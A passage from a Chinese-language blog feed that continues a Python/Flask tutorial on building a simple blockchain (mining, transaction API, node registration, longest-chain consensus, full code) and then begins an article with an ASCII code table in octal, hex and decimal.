&#x27;amount&#x27;]</span><br><span class="line">    if not all(k in values for k in required):</span><br><span class="line">        return &#x27;Missing values&#x27;, 400</span><br><span class="line"></span><br><span class="line">    # Create a new Transaction</span><br><span class="line">    index = blockchain.new_transaction(values[&#x27;sender&#x27;], values[&#x27;recipient&#x27;], values[&#x27;amount&#x27;])</span><br><span class="line"></span><br><span class="line">    response = &#123;&#x27;message&#x27;: f&#x27;Transaction will be added to Block &#123;index&#125;&#x27;&#125;</span><br><span class="line">    return jsonify(response), 201</span><br></pre></td></tr></table></figure>

<h3 id="挖矿节点"><a href="#挖矿节点" class="headerlink" title="挖矿节点"></a>挖矿节点</h3><p>挖矿节点是整个过程中最有趣的部分，它必须要达到三个目的：</p>
<p>计算工作量证明；<br>通过打包交易奖励矿工一个币；<br>通过将新块添加到链中来伪造新块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">from time import time</span><br><span class="line">from uuid import uuid4</span><br><span class="line"></span><br><span class="line">from flask import Flask, jsonify, request</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/mine&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def mine():</span><br><span class="line">    # We run the proof of work algorithm to get the next proof...</span><br><span class="line">    last_block = blockchain.last_block</span><br><span class="line">    last_proof = last_block[&#x27;proof&#x27;]</span><br><span class="line">    proof = blockchain.proof_of_work(last_proof)</span><br><span class="line"></span><br><span class="line">    # We must receive a reward for finding the proof.</span><br><span class="line">    # The sender is &quot;0&quot; to signify that this node has mined a new coin.</span><br><span class="line">    blockchain.new_transaction(</span><br><span class="line">        sender=&quot;0&quot;,</span><br><span class="line">        recipient=node_identifier,</span><br><span class="line">        amount=1,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Forge the new Block by adding it to the chain</span><br><span class="line">    previous_hash = blockchain.hash(last_block)</span><br><span class="line">    block = blockchain.new_block(proof, previous_hash)</span><br><span class="line"></span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;message&#x27;: &quot;New Block Forged&quot;,</span><br><span class="line">        &#x27;index&#x27;: block[&#x27;index&#x27;],</span><br><span class="line">        &#x27;transactions&#x27;: block[&#x27;transactions&#x27;],</span><br><span class="line">        &#x27;proof&#x27;: block[&#x27;proof&#x27;],</span><br><span class="line">        &#x27;previous_hash&#x27;: block[&#x27;previous_hash&#x27;],</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 200</span><br></pre></td></tr></table></figure>

<p>这儿要注意一下，开采区块的接收者是我们节点的地址。在这里完成的大部分工作只是与Blockchain类中的方法进行交互。下面可以开始与我们的区块链交互啦。</p>
<h3 id="第三步：实现与-Blockchain-类交互"><a href="#第三步：实现与-Blockchain-类交互" class="headerlink" title="第三步：实现与 Blockchain 类交互"></a>第三步：实现与 Blockchain 类交互</h3><p>你可以使用普通的 cURL 或者 Postman 通过网络和刚才生成的 API 进行交互。</p>
<p>启动服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python blockchain.py</span><br><span class="line">* Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)</span><br></pre></td></tr></table></figure>
<p>通过向以下地址发送请求，我们可以尝试一下挖矿。</p>
<p><code>http://localhost:5000/mine</code></p>
<p>下面我们通过向下面链接发送post请求，来创建一个新的交易：<br><code>http://localhost:5000/transactions/new</code></p>
<p>请求中要包含我们的交易结构。</p>
<p>如果你用的是cURL，则可以通过下面代码来实现。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;</span><br><span class="line"> &quot;sender&quot;: &quot;d4ee26eee15148ee92c6cd394edd974e&quot;,</span><br><span class="line"> &quot;recipient&quot;: &quot;someone-other-address&quot;,</span><br><span class="line"> &quot;amount&quot;: 5</span><br><span class="line">&#125;&#x27; &quot;http://localhost:5000/transactions/new&quot;</span><br></pre></td></tr></table></figure>
<p>完成上面步骤之后，需要重启下服务器。这时候，我挖出了2个区块，获得了3个币的奖励。这里，我们还可以像以下地址发送请求，来对整条链进行检查。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;chain&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;index&quot;: 1,</span><br><span class="line">      &quot;previous_hash&quot;: 1,</span><br><span class="line">      &quot;proof&quot;: 100,</span><br><span class="line">      &quot;timestamp&quot;: 1506280650.770839,</span><br><span class="line">      &quot;transactions&quot;: []</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;index&quot;: 2,</span><br><span class="line">      &quot;previous_hash&quot;: &quot;c099bc...bfb7&quot;,</span><br><span class="line">      &quot;proof&quot;: 35293,</span><br><span class="line">      &quot;timestamp&quot;: 1506280664.717925,</span><br><span class="line">      &quot;transactions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;amount&quot;: 1,</span><br><span class="line">          &quot;recipient&quot;: &quot;8bbcb347e0634905b0cac7955bae152b&quot;,</span><br><span class="line">          &quot;sender&quot;: &quot;0&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;index&quot;: 3,</span><br><span class="line">      &quot;previous_hash&quot;: &quot;eff91a...10f2&quot;,</span><br><span class="line">      &quot;proof&quot;: 35089,</span><br><span class="line">      &quot;timestamp&quot;: 1506280666.1086972,</span><br><span class="line">      &quot;transactions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">          &quot;amount&quot;: 1,</span><br><span class="line">          &quot;recipient&quot;: &quot;8bbcb347e0634905b0cac7955bae152b&quot;,</span><br><span class="line">          &quot;sender&quot;: &quot;0&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;length&quot;: 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第四步：形成共识"><a href="#第四步：形成共识" class="headerlink" title="第四步：形成共识"></a>第四步：形成共识</h2><p>终于写到共识了，共识机制是我认为区块链中最有意思的部分。 在上面的步骤中，我们已经创建完成了一个简单的区块链，并且能够实现交易、挖矿等基本功能。 不过，区块链上的节点应该是分散的。 如果它们是分散的，我们究竟如何确保它们记录的都是同一条链？ 这就叫共识问题。如果我们的网络中需要多个节点，我们必须实现共识算法。</p>
<h3 id="注册新节点"><a href="#注册新节点" class="headerlink" title="注册新节点"></a>注册新节点</h3><p>在我们实现共识算法之前，需要解决一个问题：在同一个网络上，让其中一个节点知道它的相邻节点有哪些。每一个节点需要网络上的其他节点进行注册。因此，我们将需要更多的节点：</p>
<p>&#x2F;nodes&#x2F;register 接受URL形式的新节点列表。<br>&#x2F;nodes&#x2F;resolve 实现我们的共识算法，它可以解决任何争议，保证节点具有正确的链。</p>
<p>下面，我们需要修改Blockchain类的结构，以及找到注册节点实现的方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        ...</span><br><span class="line">        self.nodes = set()</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    def register_node(self, address):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Add a new node to the list of nodes</span><br><span class="line">        :param address: &lt;str&gt; Address of node. Eg. &#x27;http://192.168.0.5:5000&#x27;</span><br><span class="line">        :return: None</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        parsed_url = urlparse(address)</span><br><span class="line">        self.nodes.add(parsed_url.netloc)</span><br></pre></td></tr></table></figure>

<p>这儿需要注意一下，set（）函数用来保存节点列表。 它是确保添加的新节点具有幂等性的方法，意思是无论我们使用这个方法添加特定节点多少次，它都只会出现一次。</p>
<h3 id="实现共识算法"><a href="#实现共识算法" class="headerlink" title="实现共识算法"></a>实现共识算法</h3><p>先前提到的，当某个节点与另一个节点的记录不一致时，会「打架」。为了解决这个冲突，我们需要制定一个规则，即最长而有效的链是最有权威性的。换句话说，网络上最长的链就是事实。使用这个算法，我们就可以在我们的网络上达成共识。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    def valid_chain(self, chain):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Determine if a given blockchain is valid</span><br><span class="line">        :param chain: &lt;list&gt; A blockchain</span><br><span class="line">        :return: &lt;bool&gt; True if valid, False if not</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        last_block = chain[0]</span><br><span class="line">        current_index = 1</span><br><span class="line"></span><br><span class="line">        while current_index &lt; len(chain):</span><br><span class="line">            block = chain[current_index]</span><br><span class="line">            print(f&#x27;&#123;last_block&#125;&#x27;)</span><br><span class="line">            print(f&#x27;&#123;block&#125;&#x27;)</span><br><span class="line">            print(&quot;\n-----------\n&quot;)</span><br><span class="line">            # Check that the hash of the block is correct</span><br><span class="line">            if block[&#x27;previous_hash&#x27;] != self.hash(last_block):</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            # Check that the Proof of Work is correct</span><br><span class="line">            if not self.valid_proof(last_block[&#x27;proof&#x27;], block[&#x27;proof&#x27;]):</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            last_block = block</span><br><span class="line">            current_index += 1</span><br><span class="line"></span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def resolve_conflicts(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        This is our Consensus Algorithm, it resolves conflicts</span><br><span class="line">        by replacing our chain with the longest one in the network.</span><br><span class="line">        :return: &lt;bool&gt; True if our chain was replaced, False if not</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        neighbours = self.nodes</span><br><span class="line">        new_chain = None</span><br><span class="line"></span><br><span class="line">        # We&#x27;re only looking for chains longer than ours</span><br><span class="line">        max_length = len(self.chain)</span><br><span class="line"></span><br><span class="line">        # Grab and verify the chains from all the nodes in our network</span><br><span class="line">        for node in neighbours:</span><br><span class="line">            response = requests.get(f&#x27;http://&#123;node&#125;/chain&#x27;)</span><br><span class="line"></span><br><span class="line">            if response.status_code == 200:</span><br><span class="line">                length = response.json()[&#x27;length&#x27;]</span><br><span class="line">                chain = response.json()[&#x27;chain&#x27;]</span><br><span class="line"></span><br><span class="line">                # Check if the length is longer and the chain is valid</span><br><span class="line">                if length &gt; max_length and self.valid_chain(chain):</span><br><span class="line">                    max_length = length</span><br><span class="line">                    new_chain = chain</span><br><span class="line"></span><br><span class="line">        # Replace our chain if we discovered a new, valid chain longer than ours</span><br><span class="line">        if new_chain:</span><br><span class="line">            self.chain = new_chain</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        return False</span><br></pre></td></tr></table></figure>

<p>其中，valid_chain() 方法是负责校验这一条链是否是有效的，怎么校验呢？遍历每一个区块，验证它们的哈希值和工作量证明。</p>
<p>resolve_conflicts() 是遍历我们所有相邻节点的方法，会下载它们的链，然后使用上述方法去验证它们。如果找到一个有效的链，其长度大于我们的链，就将我们的链条替换为该链。</p>
<p>下面我们在API中，注册两个节点，一个用于添加相邻节点，另一个用于解决冲突：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/nodes/register&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def register_nodes():</span><br><span class="line">    values = request.get_json()</span><br><span class="line"></span><br><span class="line">    nodes = values.get(&#x27;nodes&#x27;)</span><br><span class="line">    if nodes is None:</span><br><span class="line">        return &quot;Error: Please supply a valid list of nodes&quot;, 400</span><br><span class="line"></span><br><span class="line">    for node in nodes:</span><br><span class="line">        blockchain.register_node(node)</span><br><span class="line"></span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;message&#x27;: &#x27;New nodes have been added&#x27;,</span><br><span class="line">        &#x27;total_nodes&#x27;: list(blockchain.nodes),</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 201</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/nodes/resolve&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def consensus():</span><br><span class="line">    replaced = blockchain.resolve_conflicts()</span><br><span class="line"></span><br><span class="line">    if replaced:</span><br><span class="line">        response = &#123;</span><br><span class="line">            &#x27;message&#x27;: &#x27;Our chain was replaced&#x27;,</span><br><span class="line">            &#x27;new_chain&#x27;: blockchain.chain</span><br><span class="line">        &#125;</span><br><span class="line">    else:</span><br><span class="line">        response = &#123;</span><br><span class="line">            &#x27;message&#x27;: &#x27;Our chain is authoritative&#x27;,</span><br><span class="line">            &#x27;chain&#x27;: blockchain.chain</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return jsonify(response), 200</span><br></pre></td></tr></table></figure>

<p>此时，你可以使用不同机器（或使用同一台机器的不同端口）启动不同的节点。 我是使用的同一台机器，在另外一个端口上创建了另一个节点，并将其注册到当前节点。 因此，我有两个节点：http：&#x2F;&#x2F; localhost：5000 和 http：&#x2F;&#x2F; localhost：5001。</p>
<p>完整代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import json</span><br><span class="line">from textwrap import dedent</span><br><span class="line">from time import time</span><br><span class="line">from uuid import uuid4</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">from flask import Flask, jsonify, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Blockchain(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.current_transactions = []</span><br><span class="line"></span><br><span class="line">        self.nodes = set()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        # Create the genesis block</span><br><span class="line">        self.new_block(previous_hash=1, proof=100)</span><br><span class="line"></span><br><span class="line">    def new_block(self, proof, previous_hash=None):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Create a new Block in the Blockchain</span><br><span class="line">        :param proof: &lt;int&gt; The proof given by the Proof of Work algorithm</span><br><span class="line">        :param previous_hash: (Optional) &lt;str&gt; Hash of previous Block</span><br><span class="line">        :return: &lt;dict&gt; New Block</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        block = &#123;</span><br><span class="line">            &#x27;index&#x27;: len(self.chain) + 1,</span><br><span class="line">            &#x27;timestamp&#x27;: time(),</span><br><span class="line">            &#x27;transactions&#x27;: self.current_transactions,</span><br><span class="line">            &#x27;proof&#x27;: proof,</span><br><span class="line">            &#x27;previous_hash&#x27;: previous_hash or self.hash(self.chain[-1]),</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Reset the current list of transactions</span><br><span class="line">        self.current_transactions = []</span><br><span class="line"></span><br><span class="line">        self.chain.append(block)</span><br><span class="line">        return block</span><br><span class="line"></span><br><span class="line">    def new_transaction(self, sender, recipient, amount):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Creates a new transaction to go into the next mined Block</span><br><span class="line"></span><br><span class="line">        :param sender: &lt;str&gt; Address of the Sender</span><br><span class="line">        :param recipient: &lt;str&gt; Address of the Recipient</span><br><span class="line">        :param amount: &lt;int&gt; Amount</span><br><span class="line">        :return: &lt;int&gt; The index of the Block that will hold this transaction</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        self.current_transactions.append(&#123;</span><br><span class="line">            &#x27;sender&#x27;: sender,</span><br><span class="line">            &#x27;recipient&#x27;: recipient,</span><br><span class="line">            &#x27;amount&#x27;: amount,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        return self.last_block[&#x27;index&#x27;] + 1</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def last_block(self):</span><br><span class="line">        return self.chain[-1]</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def hash(block):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Creates a SHA-256 hash of a Block</span><br><span class="line">        :param block: &lt;dict&gt; Block</span><br><span class="line">        :return: &lt;str&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        # We must make sure that the Dictionary is Ordered, or we&#x27;ll have inconsistent hashes</span><br><span class="line">        block_string = json.dumps(block, sort_keys=True).encode()</span><br><span class="line">        return hashlib.sha256(block_string).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def proof_of_work(self, last_proof):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Simple Proof of Work Algorithm:</span><br><span class="line">         - Find a number p&#x27; such that hash(pp&#x27;) contains leading 4 zeroes, where p is the previous p&#x27;</span><br><span class="line">         - p is the previous proof, and p&#x27; is the new proof</span><br><span class="line">        :param last_proof: &lt;int&gt;</span><br><span class="line">        :return: &lt;int&gt;</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        proof = 0</span><br><span class="line">        while self.valid_proof(last_proof, proof) is False:</span><br><span class="line">            proof += 1</span><br><span class="line"></span><br><span class="line">        return proof</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def valid_proof(last_proof, proof):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Validates the Proof: Does hash(last_proof, proof) contain 4 leading zeroes?</span><br><span class="line">        :param last_proof: &lt;int&gt; Previous Proof</span><br><span class="line">        :param proof: &lt;int&gt; Current Proof</span><br><span class="line">        :return: &lt;bool&gt; True if correct, False if not.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        guess = f&#x27;&#123;last_proof&#125;&#123;proof&#125;&#x27;.encode()</span><br><span class="line">        guess_hash = hashlib.sha256(guess).hexdigest()</span><br><span class="line">        return guess_hash[:4] == &quot;0000&quot;</span><br><span class="line">    </span><br><span class="line">    def register_node(self, address):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Add a new node to the list of nodes</span><br><span class="line">        :param address: &lt;str&gt; Address of node. Eg. &#x27;http://192.168.0.5:5000&#x27;</span><br><span class="line">        :return: None</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        parsed_url = urlparse(address)</span><br><span class="line">        self.nodes.add(parsed_url.netloc)</span><br><span class="line"></span><br><span class="line">    def valid_chain(self, chain):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Determine if a given blockchain is valid</span><br><span class="line">        :param chain: &lt;list&gt; A blockchain</span><br><span class="line">        :return: &lt;bool&gt; True if valid, False if not</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        last_block = chain[0]</span><br><span class="line">        current_index = 1</span><br><span class="line"></span><br><span class="line">        while current_index &lt; len(chain):</span><br><span class="line">            block = chain[current_index]</span><br><span class="line">            print(f&#x27;&#123;last_block&#125;&#x27;)</span><br><span class="line">            print(f&#x27;&#123;block&#125;&#x27;)</span><br><span class="line">            print(&quot;\n-----------\n&quot;)</span><br><span class="line">            # Check that the hash of the block is correct</span><br><span class="line">            if block[&#x27;previous_hash&#x27;] != self.hash(last_block):</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            # Check that the Proof of Work is correct</span><br><span class="line">            if not self.valid_proof(last_block[&#x27;proof&#x27;], block[&#x27;proof&#x27;]):</span><br><span class="line">                return False</span><br><span class="line"></span><br><span class="line">            last_block = block</span><br><span class="line">            current_index += 1</span><br><span class="line"></span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">    def resolve_conflicts(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        This is our Consensus Algorithm, it resolves conflicts</span><br><span class="line">        by replacing our chain with the longest one in the network.</span><br><span class="line">        :return: &lt;bool&gt; True if our chain was replaced, False if not</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        neighbours = self.nodes</span><br><span class="line">        new_chain = None</span><br><span class="line"></span><br><span class="line">        # We&#x27;re only looking for chains longer than ours</span><br><span class="line">        max_length = len(self.chain)</span><br><span class="line"></span><br><span class="line">        # Grab and verify the chains from all the nodes in our network</span><br><span class="line">        for node in neighbours:</span><br><span class="line">            response = requests.get(f&#x27;http://&#123;node&#125;/chain&#x27;)</span><br><span class="line"></span><br><span class="line">            if response.status_code == 200:</span><br><span class="line">                length = response.json()[&#x27;length&#x27;]</span><br><span class="line">                chain = response.json()[&#x27;chain&#x27;]</span><br><span class="line"></span><br><span class="line">                # Check if the length is longer and the chain is valid</span><br><span class="line">                if length &gt; max_length and self.valid_chain(chain):</span><br><span class="line">                    max_length = length</span><br><span class="line">                    new_chain = chain</span><br><span class="line"></span><br><span class="line">        # Replace our chain if we discovered a new, valid chain longer than ours</span><br><span class="line">        if new_chain:</span><br><span class="line">            self.chain = new_chain</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"># Instantiate our Node</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># Generate a globally unique address for this node</span><br><span class="line">node_identifier = str(uuid4()).replace(&#x27;-&#x27;, &#x27;&#x27;)</span><br><span class="line"></span><br><span class="line"># Instantiate the Blockchain</span><br><span class="line">blockchain = Blockchain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/mine&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def mine():</span><br><span class="line">    # We run the proof of work algorithm to get the next proof...</span><br><span class="line">    last_block = blockchain.last_block</span><br><span class="line">    last_proof = last_block[&#x27;proof&#x27;]</span><br><span class="line">    proof = blockchain.proof_of_work(last_proof)</span><br><span class="line"></span><br><span class="line">    # We must receive a reward for finding the proof.</span><br><span class="line">    # The sender is &quot;0&quot; to signify that this node has mined a new coin.</span><br><span class="line">    blockchain.new_transaction(</span><br><span class="line">        sender=&quot;0&quot;,</span><br><span class="line">        recipient=node_identifier,</span><br><span class="line">        amount=1,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Forge the new Block by adding it to the chain</span><br><span class="line">    previous_hash = blockchain.hash(last_block)</span><br><span class="line">    block = blockchain.new_block(proof, previous_hash)</span><br><span class="line"></span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;message&#x27;: &quot;New Block Forged&quot;,</span><br><span class="line">        &#x27;index&#x27;: block[&#x27;index&#x27;],</span><br><span class="line">        &#x27;transactions&#x27;: block[&#x27;transactions&#x27;],</span><br><span class="line">        &#x27;proof&#x27;: block[&#x27;proof&#x27;],</span><br><span class="line">        &#x27;previous_hash&#x27;: block[&#x27;previous_hash&#x27;],</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 200</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/transactions/new&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def new_transaction():</span><br><span class="line">    values = request.get_json()</span><br><span class="line"></span><br><span class="line">    # Check that the required fields are in the POST&#x27;ed data</span><br><span class="line">    required = [&#x27;sender&#x27;, &#x27;recipient&#x27;, &#x27;amount&#x27;]</span><br><span class="line">    if not all(k in values for k in required):</span><br><span class="line">        return &#x27;Missing values&#x27;, 400</span><br><span class="line"></span><br><span class="line">    # Create a new Transaction</span><br><span class="line">    index = blockchain.new_transaction(values[&#x27;sender&#x27;], values[&#x27;recipient&#x27;], values[&#x27;amount&#x27;])</span><br><span class="line"></span><br><span class="line">    response = &#123;&#x27;message&#x27;: f&#x27;Transaction will be added to Block &#123;index&#125;&#x27;&#125;</span><br><span class="line">    return jsonify(response), 201</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/chain&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def full_chain():</span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;chain&#x27;: blockchain.chain,</span><br><span class="line">        &#x27;length&#x27;: len(blockchain.chain),</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 200</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/nodes/register&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def register_nodes():</span><br><span class="line">    values = request.get_json()</span><br><span class="line"></span><br><span class="line">    nodes = values.get(&#x27;nodes&#x27;)</span><br><span class="line">    if nodes is None:</span><br><span class="line">        return &quot;Error: Please supply a valid list of nodes&quot;, 400</span><br><span class="line"></span><br><span class="line">    for node in nodes:</span><br><span class="line">        blockchain.register_node(node)</span><br><span class="line"></span><br><span class="line">    response = &#123;</span><br><span class="line">        &#x27;message&#x27;: &#x27;New nodes have been added&#x27;,</span><br><span class="line">        &#x27;total_nodes&#x27;: list(blockchain.nodes),</span><br><span class="line">    &#125;</span><br><span class="line">    return jsonify(response), 201</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/nodes/resolve&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def consensus():</span><br><span class="line">    replaced = blockchain.resolve_conflicts()</span><br><span class="line"></span><br><span class="line">    if replaced:</span><br><span class="line">        response = &#123;</span><br><span class="line">            &#x27;message&#x27;: &#x27;Our chain was replaced&#x27;,</span><br><span class="line">            &#x27;new_chain&#x27;: blockchain.chain</span><br><span class="line">        &#125;</span><br><span class="line">    else:</span><br><span class="line">        response = &#123;</span><br><span class="line">            &#x27;message&#x27;: &#x27;Our chain is authoritative&#x27;,</span><br><span class="line">            &#x27;chain&#x27;: blockchain.chain</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    return jsonify(response), 200</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=5000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后，我在第二个节点上挖出了一些新的区块，以确保第二个节点的链条比第一个节点的链条更长。 之后，我在第一个节点上调用 GET &#x2F; nodes &#x2F; resolve，使其中链通过共识算法被第二个节点的链条取代。</p>
]]></content>
      <categories>
        <category>架构</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>ASCII码表:八进制 十六进制 十进制对应</title>
    <url>/blog/basetech/charset/ascii/</url>
    <content><![CDATA[<p>目前计算机中用得最广泛的字符集及其编码，是由美国国家标准局(ANSI)制定的ASCII码（American Standard Code for Information Interchange，美国标准信息交换码），它已被国际标准化组织（ISO）定为国际标准，称为ISO646标准。适用于所有拉丁文字字母，ASCII码有7位码和8位码两种形式。</p>
<p>因为1位二进制数可以表示（21&#x3D;）2种状态：0、1；而2位二进制数可以表示（22）&#x3D;4种状态：00、01、10、11；依次类推，7位二进制数可以表示（27&#x3D;）128种状态，每种状态都唯一地编为一个7位的二进制码，对应一个字符（或控制码），这些码可以排列成一个十进制序号0～127。所以，7位ASCII码是用七位二进制数进行编码的，可以表示128个字符。<br>第0～32号及第127号(共34个)是控制字符或通讯专用字符，如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BEL（振铃）等；通讯专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；</p>
<p>第33～126号(共94个)是字符，其中第48～57号为0～9十个阿拉伯数字；65～90号为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。</p>
<table>
<thead>
<tr>
<th>八进制</th>
<th>十六进制</th>
<th>十进制</th>
<th>字符</th>
<th>八进制</th>
<th>十六进制</th>
<th>十进制</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>00</td>
<td>00</td>
<td>0</td>
<td>nul</td>
<td>100</td>
<td>40</td>
<td>64</td>
<td>@</td>
</tr>
<tr>
<td>01</td>
<td>01</td>
<td>1</td>
<td>soh</td>
<td>101</td>
<td>41</td>
<td>65</td>
<td>A</td>
</tr>
<tr>
<td>02</td>
<td>02</td>
<td>2</td>
<td>stx</td>
<td>102</td>
<td>42</td>
<td>66</td>
<td>B</td>
</tr>
<tr>
<td>03</td>
<td>03</td>
<td>3</td>
<td>etx</td>
<td>103</td>
<td>43</td>
<td>67</td>
<td>C</td>
</tr>
<tr>
<td>04</td>
<td>04</td>
<td>4</td>
<td>eot</td>
<td>104</td>
<td>44</td>
<td>68</td>
<td>D</td>
</tr>
<tr>
<td>05</td>
<td>05</td>
<td>5</td>
<td>enq</td>
<td>105</td>
<td>45</td>
<td>69</td>
<td>E</td>
</tr>
<tr>
<td>06</td>
<td>06</td>
<td>6</td>
<td>ack</td>
<td>106</td>
<td>46</td>
<td>70</td>
<td>F</td>
</tr>
<tr>
<td>07</td>
<td>07</td>
<td>7</td>
<td>bel</td>
<td>107</td>
<td>47</td>
<td>71</td>
<td>G</td>
</tr>
<tr>
<td>10</td>
<td>08</td>
<td>8</td>
<td>bs</td>
<td>110</td>
<td>48</td>
<td>72</td>
<td>H</td>
</tr>
<tr>
<td>11</td>
<td>09</td>
<td>9</td>
<td>ht</td>
<td>111</td>
<td>49</td>
<td>73</td>
<td>I</td>
</tr>
<tr>
<td>12</td>
<td>0a</td>
<td>10</td>
<td>nl</td>
<td>112</td>
<td>4a</td>
<td>74</td>
<td>J</td>
</tr>
<tr>
<td>13</td>
<td>0b</td>
<td>11</td>
<td>vt</td>
<td>113</td>
<td>4b</td>
<td>75</td>
<td>K</td>
</tr>
